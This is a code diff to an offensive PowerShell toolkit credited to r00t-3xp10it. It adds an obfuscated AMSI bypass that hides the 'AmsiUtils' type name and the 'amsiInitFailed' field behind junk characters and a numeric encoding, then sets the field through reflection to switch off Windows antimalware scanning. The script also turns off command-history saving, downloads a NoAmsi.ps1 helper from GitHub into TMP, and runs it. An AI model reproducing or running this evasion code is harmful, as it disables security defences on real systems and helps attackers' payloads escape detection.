@@ -146,6 +146,23 @@ Write-Host "$Banner" -ForegroundColor Blue
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 
 
+try {
+
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - 'AmsiStringDetectionBypass'
+   #>
+
+   $MsTeamsId = "4456625220575263174452554847"
+   $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
+   $Drawing = "Sy@ste£.M@ana"+"ge£e@nt" + ".Auto@£ati@on."+"A£s@i"+"U@ti@ls" -Join ''
+   $Graphics = [string](0..13|%{[char][int](53+($MsTeamsId).substring(($_*2),2))}) -Replace ' '
+   $imgForm = $Drawing.Replace("@","").Replace("£","m");$Bitmap = [Ref].Assembly.GetType($imgForm)
+   $i0Stream = $Bitmap.GetField($Graphics,"$ComponentDeviceId,Static");$i0Stream.SetValue($null,$true)
+}catch{}
+
+
 If($Help -ieq "Parameters"){
 
    <#
@@ -3241,7 +3258,7 @@ If($NoAmsi -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/NoAmsi.ps1 -Destination $Env:TMP\NoAmsi.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\NoAmsi.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 29){## Corrupted download detected => DefaultFileSize: 29,0517578125/KB
+      If($SizeDump -lt 32){## Corrupted download detected => DefaultFileSize: 32,345703125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\NoAmsi.ps1"){Remove-Item -Path "$Env:TMP\NoAmsi.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -3259,7 +3276,7 @@ If($NoAmsi -ne "false"){
    ElseIf($NoAmsi -ieq "TestAll" -or $NoAmsi -ieq "Bypass")
    {
       If($Id -eq "false"){$Id = "2"}
-      powershell -File "$Env:TMP\NoAmsi.ps1" -Action TestAll -Id $Id
+      powershell -File "$Env:TMP\NoAmsi.ps1" -Action $NoAmsi -Id $Id
    }
    Else
    {
